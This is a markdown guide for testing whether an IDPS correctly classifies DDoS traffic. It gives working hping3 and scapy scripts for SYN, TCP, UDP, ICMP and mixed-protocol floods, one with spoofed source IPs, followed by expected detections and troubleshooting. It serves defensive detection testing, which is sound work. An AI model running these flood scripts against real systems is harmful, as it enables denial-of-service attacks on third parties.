# DDoS Attack Testing Guide

This guide provides step-by-step instructions for testing different types of DDoS attacks against the IDPS system. The system now identifies specific DDoS attack types including:

- **DDoS TCP** - Generic TCP-based DDoS
- **DDoS TCP Flood** - High-volume TCP flood attack
- **DDoS TCP SYN Flood** - SYN flood attack targeting a specific port
- **DDoS UDP** - Generic UDP-based DDoS
- **DDoS UDP Flood** - High-volume UDP flood attack
- **DDoS UDP Reflection** - UDP reflection attack with many destination ports
- **DDoS ICMP** - Generic ICMP-based DDoS
- **DDoS ICMP Flood** - High-volume ICMP flood attack
- **DDoS Mixed Protocol** - Attack using multiple protocols

## Prerequisites

1. **System Setup**
   - Backend server running on port 8000
   - Database configured and running
   - Traffic monitoring enabled
   - Admin access to the system

2. **Testing Tools**
   - `hping3` - For TCP/UDP/ICMP packet generation
   - `nmap` - For port scanning and network testing
   - `scapy` (Python) - For custom packet generation
   - `iperf3` - For bandwidth testing
   - `curl` or `wget` - For HTTP requests

3. **Network Access**
   - Access to the target machine's network interface
   - Permission to send packets (may require sudo/root)
   - Knowledge of target IP address

## Testing Environment Setup

### 1. Start the Backend and Monitoring

```bash
# Navigate to backend directory
cd backend

# Start the backend server
python -m uvicorn app.main:app --host 0.0.0.0 --port 8000

# In another terminal, start traffic monitoring
python -m app.traffic_monitor
```

### 2. Verify Monitoring is Active

Check the backend logs to confirm:
- ✅ Model loaded successfully
- ✅ Monitoring started on interface
- ✅ Ready to capture packets

## DDoS Attack Testing Procedures

### Test 1: DDoS TCP SYN Flood

**Objective**: Test detection of SYN flood attacks targeting a specific port.

**Procedure**:
```bash
# Using hping3 - SYN flood to port 80
sudo hping3 -S -p 80 --flood <TARGET_IP>

# Or using hping3 with specific rate (1000 packets/sec)
sudo hping3 -S -p 80 -i u1000 <TARGET_IP>

# Using Python with scapy
python3 << EOF
from scapy.all import *
import time

target_ip = "<TARGET_IP>"
target_port = 80

for i in range(10000):
    packet = IP(dst=target_ip)/TCP(dport=target_port, flags="S")
    send(packet, verbose=0)
    if i % 1000 == 0:
        print(f"Sent {i} SYN packets")
EOF
```

**Expected Detection**:
- Attack Type: **DDoS TCP SYN Flood**
- Detection within 2-5 seconds
- High packet rate (>500 packets/sec)
- Single destination port

**Verification**:
```bash
# Check alerts via API
curl http://localhost:8000/api/dashboard/alerts | jq '.'
```

---

### Test 2: DDoS TCP Flood

**Objective**: Test detection of high-volume TCP flood attacks.

**Procedure**:
```bash
# High-rate TCP flood using hping3
sudo hping3 -S -p 80 --flood <TARGET_IP>

# Or with multiple ports
for port in 80 443 8080; do
    sudo hping3 -S -p $port -i u500 <TARGET_IP> &
done

# Using Python with scapy (high volume)
python3 << EOF
from scapy.all import *
import random

target_ip = "<TARGET_IP>"
ports = [80, 443, 8080, 22, 21]

for i in range(50000):
    packet = IP(dst=target_ip)/TCP(dport=random.choice(ports), flags="S")
    send(packet, verbose=0)
    if i % 5000 == 0:
        print(f"Sent {i} TCP packets")
EOF
```

**Expected Detection**:
- Attack Type: **DDoS TCP Flood** (if >1000 packets/sec)
- Attack Type: **DDoS TCP** (if lower rate)
- High packet volume
- Multiple destination ports possible

---

### Test 3: DDoS UDP Flood

**Objective**: Test detection of UDP flood attacks.

**Procedure**:
```bash
# UDP flood using hping3
sudo hping3 --udp -p 53 --flood <TARGET_IP>

# High-rate UDP flood
sudo hping3 --udp -p 53 -i u500 <TARGET_IP>

# Using Python with scapy
python3 << EOF
from scapy.all import *
import random

target_ip = "<TARGET_IP>"
target_port = 53  # DNS port

for i in range(50000):
    packet = IP(dst=target_ip)/UDP(dport=target_port)/Raw(load="A"*100)
    send(packet, verbose=0)
    if i % 5000 == 0:
        print(f"Sent {i} UDP packets")
EOF
```

**Expected Detection**:
- Attack Type: **DDoS UDP Flood** (if >2000 packets/sec)
- Attack Type: **DDoS UDP** (if lower rate)
- High UDP packet volume

---

### Test 4: DDoS UDP Reflection

**Objective**: Test detection of UDP reflection attacks (many destination ports).

**Procedure**:
```bash
# UDP packets to many different ports
python3 << EOF
from scapy.all import *
import random

target_ip = "<TARGET_IP>"

# Send UDP packets to 200+ different ports
for i in range(10000):
    port = random.randint(1, 65535)
    packet = IP(dst=target_ip)/UDP(dport=port)/Raw(load="A"*50)
    send(packet, verbose=0)
    if i % 1000 == 0:
        print(f"Sent {i} UDP packets to random ports")
EOF
```

**Expected Detection**:
- Attack Type: **DDoS UDP Reflection**
- Many unique destination ports (>100)
- Moderate to high packet rate

---

### Test 5: DDoS ICMP Flood

**Objective**: Test detection of ICMP flood attacks (ping flood).

**Procedure**:
```bash
# ICMP flood using hping3
sudo hping3 --icmp --flood <TARGET_IP>

# Or using ping flood
sudo ping -f <TARGET_IP>

# Using Python with scapy
python3 << EOF
from scapy.all import *

target_ip = "<TARGET_IP>"

for i in range(10000):
    packet = IP(dst=target_ip)/ICMP()
    send(packet, verbose=0)
    if i % 1000 == 0:
        print(f"Sent {i} ICMP packets")
EOF
```

**Expected Detection**:
- Attack Type: **DDoS ICMP Flood** (if >1000 packets/sec)
- Attack Type: **DDoS ICMP** (if lower rate)
- High ICMP packet volume

---

### Test 6: DDoS Mixed Protocol

**Objective**: Test detection of attacks using multiple protocols.

**Procedure**:
```bash
# Send mixed TCP, UDP, and ICMP packets
python3 << EOF
from scapy.all import *
import random
import time

target_ip = "<TARGET_IP>"

for i in range(10000):
    protocol = random.choice(['tcp', 'udp', 'icmp'])
    
    if protocol == 'tcp':
        packet = IP(dst=target_ip)/TCP(dport=random.randint(1, 65535), flags="S")
    elif protocol == 'udp':
        packet = IP(dst=target_ip)/UDP(dport=random.randint(1, 65535))
    else:  # icmp
        packet = IP(dst=target_ip)/ICMP()
    
    send(packet, verbose=0)
    if i % 1000 == 0:
        print(f"Sent {i} mixed protocol packets")
EOF
```

**Expected Detection**:
- Attack Type: **DDoS Mixed Protocol**
- TCP ratio > 30% and UDP ratio > 30%
- Multiple protocols in same flow

---

## Advanced Testing Scenarios

### Test 7: Low-Rate DDoS (Stealth Attack)

**Objective**: Test detection of low-rate attacks that might evade detection.

```bash
# Low-rate TCP flood (100 packets/sec)
sudo hping3 -S -p 80 -i u10000 <TARGET_IP>
```

**Expected**: May be detected as **DDoS TCP** if it exceeds threshold.

---

### Test 8: Distributed Attack Simulation

**Objective**: Simulate attack from multiple source IPs.

```bash
# Using Python with scapy - spoof source IPs
python3 << EOF
from scapy.all import *
import random

target_ip = "<TARGET_IP>"

for i in range(10000):
    # Spoof source IP
    src_ip = f"192.168.{random.randint(1, 255)}.{random.randint(1, 255)}"
    packet = IP(src=src_ip, dst=target_ip)/TCP(dport=80, flags="S")
    send(packet, verbose=0)
    if i % 1000 == 0:
        print(f"Sent {i} packets from spoofed IPs")
EOF
```

---

## Monitoring and Verification

### 1. Real-time Alert Monitoring

```bash
# Watch alerts in real-time
watch -n 1 'curl -s http://localhost:8000/api/dashboard/alerts | jq ".[] | {attack_type, src_ip, dst_ip, score, event_ts}"'
```

### 2. Check Attack Type Distribution

```bash
# Get attack type statistics
curl -s http://localhost:8000/api/dashboard/alerts | jq '[.[] | .attack_type] | group_by(.) | map({type: .[0], count: length})'
```

### 3. View Alert Details

```bash
# Get specific alert details
curl -s http://localhost:8000/api/dashboard/alerts | jq '.[0]'
```

### 4. Check Dashboard

Access the web dashboard:
```
http://localhost:8000/docs
```

Navigate to `/api/dashboard/alerts` endpoint to view all alerts.

---

## Testing Checklist

- [ ] **DDoS TCP SYN Flood** - Detected correctly
- [ ] **DDoS TCP Flood** - Detected correctly
- [ ] **DDoS TCP** - Detected correctly
- [ ] **DDoS UDP Flood** - Detected correctly
- [ ] **DDoS UDP** - Detected correctly
- [ ] **DDoS UDP Reflection** - Detected correctly
- [ ] **DDoS ICMP Flood** - Detected correctly
- [ ] **DDoS ICMP** - Detected correctly
- [ ] **DDoS Mixed Protocol** - Detected correctly

---

## Troubleshooting

### Attack Not Detected

1. **Check Monitoring Status**
   ```bash
   # Verify monitoring is running
   ps aux | grep traffic_monitor
   ```

2. **Check Threshold Settings**
   - Default threshold is 0.50
   - Lower threshold for testing: Modify in traffic_monitor.py

3. **Verify Packet Capture**
   ```bash
   # Test packet capture manually
   sudo tcpdump -i any -c 10
   ```

4. **Check Model Loading**
   - Verify model files exist in `models/` directory
   - Check backend logs for model loading errors

### False Positives

1. **Adjust Threshold**
   - Increase threshold to reduce false positives
   - Modify `threshold` parameter in TrafficMonitor initialization

2. **Review Attack Type Logic**
   - Check `_identify_attack_type()` method
   - Adjust protocol ratio thresholds if needed

---

## Safety and Legal Considerations

⚠️ **IMPORTANT**: Only test on systems you own or have explicit written permission to test.

1. **Isolated Test Environment**: Use isolated network/VMs for testing
2. **Rate Limiting**: Don't overwhelm production systems
3. **Legal Compliance**: Ensure all testing complies with local laws
4. **Documentation**: Keep records of all testing activities

---

## Performance Benchmarks

Expected detection times:
- **SYN Flood**: 1-3 seconds
- **TCP/UDP Flood**: 2-5 seconds
- **ICMP Flood**: 2-5 seconds
- **Mixed Protocol**: 3-5 seconds

Detection accuracy should be >90% for attacks exceeding threshold.

---

## Next Steps

After testing:
1. Review alert logs and attack type classifications
2. Adjust thresholds if needed
3. Fine-tune attack type identification logic
4. Document any false positives/negatives
5. Update model training if needed

---

## Support

For issues or questions:
- Check backend logs: `backend/logs/`
- Review traffic monitor output
- Check database alerts table
- Consult system documentation

